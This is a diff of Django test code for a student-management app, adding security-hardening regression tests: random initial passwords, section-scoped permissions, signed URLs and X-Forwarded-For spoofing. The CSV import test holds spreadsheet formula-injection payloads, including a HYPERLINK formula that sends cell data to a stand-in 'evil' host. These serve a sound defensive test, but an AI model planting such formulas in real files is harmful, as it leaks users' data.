@@ -54,6 +54,8 @@ class UserModelTests(TestCase):
         from .models import derive_passout_year
 
         self.assertEqual(derive_passout_year("21CSE01"), 2025)
+        # The college's real roll format (23MH1A05I6) also derives correctly.
+        self.assertEqual(derive_passout_year("23MH1A05I6"), 2027)
         self.assertEqual(derive_passout_year("20A"), 2024)
         self.assertIsNone(derive_passout_year("CSE01"))
         self.assertIsNone(derive_passout_year(""))
@@ -85,11 +87,16 @@ class CsvImportTests(TestCase):
         student = User.objects.get(roll_number="21CSE01")
         self.assertEqual(student.branch, self.branch)
         self.assertEqual(student.section, self.section)
-        # Default password is the uppercase roll number, stored with the fast
-        # import hasher so large imports stay fast.
+        # Every new account gets a RANDOM initial password (never the roll
+        # number), stored with the import hasher so large imports stay fast.
         self.assertTrue(student.password.startswith("pbkdf2_sha256_import$"))
+        self.assertFalse(student.check_password("21CSE01"))
+        # The one-time credentials come back in the import result.
+        creds = {c["roll_number"]: c["password"] for c in result["credentials"]}
+        self.assertEqual(len(creds), 2)
+        self.assertNotEqual(creds["21CSE01"], "21CSE01")
+        self.assertTrue(student.check_password(creds["21CSE01"]))
         # First password check verifies AND upgrades to the strong default hasher.
-        self.assertTrue(student.check_password("21CSE01"))
         self.assertTrue(student.password.startswith("pbkdf2_sha256$"))
 
     def test_admin_import_requires_branch(self):
@@ -263,8 +270,10 @@ class CsvImportForCrTests(TestCase):
         a = User.objects.get(roll_number="21CSE01")
         self.assertEqual(a.branch, self.branch)
         self.assertEqual(a.section, self.section_a)
-        # Default password is the uppercase roll number.
-        self.assertTrue(a.check_password("21CSE01"))
+        # Random initial password - never the roll number.
+        self.assertFalse(a.check_password("21CSE01"))
+        creds = {c["roll_number"]: c["password"] for c in result["credentials"]}
+        self.assertTrue(a.check_password(creds["21CSE01"]))
 
     def test_cr_import_skips_roll_numbers_from_other_sections(self):
         existing = User.objects.create_user(
@@ -795,7 +804,11 @@ class FacultyManagementTests(TestCase):
         faculty = User.objects.get(roll_number="FAC01")
         self.assertEqual(faculty.role, User.Role.FACULTY)
         self.assertTrue(faculty.is_faculty)
-        self.assertTrue(faculty.check_password("FAC01"))  # default = roll number
+        # Random initial password returned once in the create response.
+        initial = response.data.get("initial_password")
+        self.assertTrue(initial)
+        self.assertFalse(faculty.check_password("FAC01"))
+        self.assertTrue(faculty.check_password(initial))
 
     def test_faculty_requires_branch(self):
         client = self._client()
@@ -885,8 +898,11 @@ class AdminManagementTests(TestCase):
         new_admin = User.objects.get(roll_number="ADMIN2")
         self.assertEqual(new_admin.role, User.Role.SUPER_ADMIN)
         self.assertTrue(new_admin.is_super_admin)
-        # Default password is the roll number.
-        self.assertTrue(new_admin.check_password("ADMIN2"))
+        # Random initial password returned once in the create response.
+        initial = response.data.get("initial_password")
+        self.assertTrue(initial)
+        self.assertFalse(new_admin.check_password("ADMIN2"))
+        self.assertTrue(new_admin.check_password(initial))
 
     def test_non_admin_cannot_manage_admins(self):
         faculty = User.objects.create_user(
@@ -932,7 +948,11 @@ class AdminManagementTests(TestCase):
         self.assertEqual(response.status_code, 200, response.data)
         new_admin = User.objects.get(roll_number="NEWADMIN")
         self.assertEqual(new_admin.role, User.Role.SUPER_ADMIN)
-        self.assertTrue(new_admin.check_password("NEWADMIN"))
+        # Random initial password returned once on the transferred admin.
+        initial = response.data.get("admin", {}).get("initial_password")
+        self.assertTrue(initial)
+        self.assertFalse(new_admin.check_password("NEWADMIN"))
+        self.assertTrue(new_admin.check_password(initial))
         # The caller is demoted to a regular student and loses staff flags.
         self.admin.refresh_from_db()
         self.assertEqual(self.admin.role, User.Role.STUDENT)
@@ -1366,7 +1386,11 @@ class AdminManagementTests(TestCase):
         promoted = APIClient()
         login = promoted.post(
             "/api/auth/login/",
-            {"roll_number": "NEWADMIN", "password": "NEWADMIN"},
+            {
+                "roll_number": "NEWADMIN",
+                # Random initial password returned once on the transfer response.
+                "password": response.data["admin"]["initial_password"],
+            },
             format="json",
         )
         promoted.credentials(HTTP_AUTHORIZATION=f"Bearer {login.data['access']}")
@@ -2855,3 +2879,171 @@ class PortfolioTests(TestCase):
         self.assertEqual(portfolio.rebuild_requirements, "AWS + Java, 8 LPA")
         user_texts = [c.args[1] for c in mock_json.call_args_list if len(c.args) > 1]
         self.assertTrue(any("AWS + Java" in t for t in user_texts), "requirements must reach the AI")
+
+
+class SecurityHardeningTests(TestCase):
+    """Regression tests for the OWASP-style hardening batch."""
+
+    def setUp(self):
+        self.branch = Branch.objects.create(name="CSE")
+        self.section_a = Section.objects.create(branch=self.branch, name="A")
+        self.section_b = Section.objects.create(branch=self.branch, name="B")
+        self.admin = User.objects.create_superuser(
+            roll_number="admin", password="x", full_name="Admin"
+        )
+        self.cr = User.objects.create_user(
+            roll_number="CR01", password="x", full_name="CR",
+            branch=self.branch, section=self.section_a, role=User.Role.CR,
+        )
+        self.student_a = User.objects.create_user(
+            roll_number="23MH1A05I6", password="x", full_name="Aarav",
+            branch=self.branch, section=self.section_a,
+        )
+        self.student_b = User.objects.create_user(
+            roll_number="23MH1A05I7", password="x", full_name="Bhavya",
+            branch=self.branch, section=self.section_b,
+        )
+
+    def _client(self, user) -> APIClient:
+        client = APIClient()
+        login = client.post(
+            "/api/auth/login/",
+            {"roll_number": user.roll_number, "password": "x"},
+            format="json",
+        )
+        client.credentials(HTTP_AUTHORIZATION=f"Bearer {login.data['access']}")
+        return client
+
+    def _csv(self, content: str):
+        return SimpleUploadedFile("students.csv", content.encode("utf-8"))
+
+    def test_generated_passwords_are_random_and_never_the_roll_number(self):
+        pw1 = services.generate_secure_password()
+        pw2 = services.generate_secure_password()
+        self.assertNotEqual(pw1, pw2)
+        self.assertGreaterEqual(len(pw1), 8)
+        for roll in ("23MH1A05I6", "23MH1A05I7", "admin"):
+            self.assertNotEqual(pw1, roll)
+
+    def test_csv_import_neutralizes_formula_injection(self):
+        csv_content = (
+            "Roll Number,Student Name,Email,Phone\n"
+            "23MH1A05I8,=HYPERLINK(\"http://evil\"&A1),=2+2,+91 7799538830\n"
+            "23MH1A05I9,Deepak,@SUM(A1),-1+2\n"
+        )
+        result = services.import_students_csv(
+            self._csv(csv_content), self.admin,
+            branch_id=self.branch.id, section_id=self.section_a.id,
+        )
+        self.assertEqual(result["created"], 2, result)
+        a = User.objects.get(roll_number="23MH1A05I8")
+        # Formula-like cells are neutralized with the spreadsheet text marker.
+        self.assertTrue(a.full_name.startswith("'"))
+        self.assertTrue(a.email.startswith("'"))
+        # A legitimate +91 phone is preserved untouched.
+        self.assertEqual(a.phone, "+91 7799538830")
+        b = User.objects.get(roll_number="23MH1A05I9")
+        self.assertEqual(b.full_name, "Deepak")  # legit name untouched
+        self.assertTrue(b.email.startswith("'"))
+        self.assertTrue(b.phone.startswith("'"))
+
+    def test_cr_cannot_touch_student_from_another_section(self):
+        client = self._client(self.cr)
+        # Update
+        patch_resp = client.patch(
+            f"/api/students/{self.student_b.id}/",
+            {"full_name": "Hacked"}, format="json",
+        )
+        self.assertEqual(patch_resp.status_code, 403)
+        # Reset password
+        reset_resp = client.post(
+            f"/api/students/{self.student_b.id}/reset_password/",
+            {"new_password": "Hacked@123"}, format="json",
+        )
+        self.assertEqual(reset_resp.status_code, 403)
+        # Delete
+        delete_resp = client.delete(f"/api/students/{self.student_b.id}/")
+        self.assertEqual(delete_resp.status_code, 403)
+        # The other-section student is untouched.
+        self.student_b.refresh_from_db()
+        self.assertEqual(self.student_b.full_name, "Bhavya")
+        self.assertTrue(self.student_b.check_password("x"))
+        self.assertTrue(User.objects.filter(pk=self.student_b.id).exists())
+
+    def test_cr_can_manage_student_in_own_section(self):
+        client = self._client(self.cr)
+        response = client.patch(
+            f"/api/students/{self.student_a.id}/",
+            {"full_name": "Aarav Updated"}, format="json",
+        )
+        self.assertEqual(response.status_code, 200, response.data)
+        self.student_a.refresh_from_db()
+        self.assertEqual(self.student_a.full_name, "Aarav Updated")
+
+    def test_bulk_reset_password_returns_random_credentials(self):
+        client = self._client(self.admin)
+        response = client.post(
+            "/api/students/bulk_reset_password/",
+            {"ids": [self.student_a.id, self.student_b.id]},
+            format="json",
+        )
+        self.assertEqual(response.status_code, 200, response.data)
+        self.assertEqual(response.data["updated"], 2)
+        creds = {c["roll_number"]: c["password"] for c in response.data["credentials"]}
+        self.assertEqual(len(creds), 2)
+        self.assertNotEqual(creds["23MH1A05I6"], "23MH1A05I6")
+        self.assertNotEqual(creds["23MH1A05I7"], "23MH1A05I7")
+        self.student_a.refresh_from_db()
+        self.student_b.refresh_from_db()
+        self.assertTrue(self.student_a.check_password(creds["23MH1A05I6"]))
+        self.assertTrue(self.student_b.check_password(creds["23MH1A05I7"]))
+        # The old predictable password no longer works.
+        self.assertFalse(self.student_a.check_password("23MH1A05I6"))
+
+    def test_cr_bulk_reset_scoped_to_own_section(self):
+        client = self._client(self.cr)
+        response = client.post(
+            "/api/students/bulk_reset_password/",
+            {"ids": [self.student_a.id, self.student_b.id]},
+            format="json",
+        )
+        self.assertEqual(response.status_code, 200)
+        self.assertEqual(response.data["updated"], 1)
+        rolls = {c["roll_number"] for c in response.data["credentials"]}
+        self.assertEqual(rolls, {"23MH1A05I6"})
+
+    def test_resume_serializer_exposes_signed_url_not_raw(self):
+        from .serializers import ResumeSerializer
+
+        resume = Resume.objects.create(
+            student=self.student_a,
+            file_name="r.pdf", file_size=10,
+            cloudinary_url="https://res.cloudinary.com/raw/upload/v1/r.pdf",
+            public_id="resumes/cse/a/r.pdf",
+        )
+        with patch(
+            "apps.documents.services.cloudinary.utils.cloudinary_url",
+            return_value=("https://res.cloudinary.com/signed/r.pdf", {}),
+        ):
+            data = ResumeSerializer(resume).data
+        self.assertIn("signed", data["cloudinary_url"])
+        self.assertNotIn("raw/upload", data["cloudinary_url"])
+
+    def test_get_client_ip_resists_xff_spoofing(self):
+        from apps.core.utils import get_client_ip
+        from django.test import RequestFactory
+
+        factory = RequestFactory()
+        # Attacker forges X-Forwarded-For while the app is NOT behind a proxy.
+        req = factory.get("/", HTTP_X_FORWARDED_FOR="1.2.3.4", REMOTE_ADDR="203.0.113.9")
+        with override_settings(TRUST_X_FORWARDED_FOR=False):
+            self.assertEqual(get_client_ip(req), "203.0.113.9")
+        # Behind the trusted proxy: the LAST XFF entry is the real client (the
+        # proxy appended it); the earlier forged entry is ignored.
+        req = factory.get(
+            "/",
+            HTTP_X_FORWARDED_FOR="1.2.3.4, 203.0.113.9",
+            REMOTE_ADDR="10.0.0.1",
+        )
+        with override_settings(TRUST_X_FORWARDED_FOR=True):
+            self.assertEqual(get_client_ip(req), "203.0.113.9")
